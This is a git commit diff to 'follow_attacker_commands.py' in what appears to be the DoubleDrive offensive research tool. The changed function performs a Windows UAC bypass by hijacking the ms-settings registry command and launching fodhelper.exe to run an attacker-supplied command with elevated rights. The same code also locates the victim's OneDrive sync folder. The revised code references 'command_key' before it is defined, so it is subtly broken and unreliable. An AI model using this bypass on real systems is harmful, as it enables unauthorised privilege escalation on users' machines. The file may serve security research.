95c19ab231c368a5019c78af22c4717785dbc337
Or Yair <or.yair@safebreach.com>
2023-08-13 10:20:51 -0700

    fixed follow_attacker_commands to close registry handles

--- onedrive_doubledrive/follow_attacker_commands.py
+++ onedrive_doubledrive/follow_attacker_commands.py
@@ -7,16 +7,18 @@ from config import get_configs, ConfigKey
 
 def run_command_with_uac_bypass(command):
     hkcu_key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
-    reg_key = winreg.CreateKeyEx(hkcu_key, "Software\\Classes\\ms-settings\\Shell\\Open")
-    command_key = winreg.CreateKeyEx(reg_key, "command")
-    winreg.SetValueEx(command_key, "DelegateExecute", 0, winreg.REG_SZ, "")
-    winreg.SetValue(command_key, None, winreg.REG_SZ, command)
+    with winreg.CreateKeyEx(hkcu_key, "Software\\Classes\\ms-settings\\Shell\\Open") as reg_key:
+        winreg.SetValueEx(command_key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        
+        with winreg.CreateKeyEx(reg_key, "command") as command_key:
+            winreg.SetValue(command_key, None, winreg.REG_SZ, command)
+
     os.system("fodhelper.exe")
 
 def get_onedrive_sync_folder():
     hkcu_key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
-    onedrive_personal_reg_key = winreg.OpenKey(hkcu_key, "Software\\Microsoft\\OneDrive\\Accounts\\Personal")
-    onedrive_sync_folder = winreg.QueryValueEx(onedrive_personal_reg_key, "UserFolder")[0]
+    with winreg.OpenKey(hkcu_key, "Software\\Microsoft\\OneDrive\\Accounts\\Personal") as onedrive_personal_reg_key:
+        onedrive_sync_folder = winreg.QueryValueEx(onedrive_personal_reg_key, "UserFolder")[0]
     return onedrive_sync_folder
 
 def main():
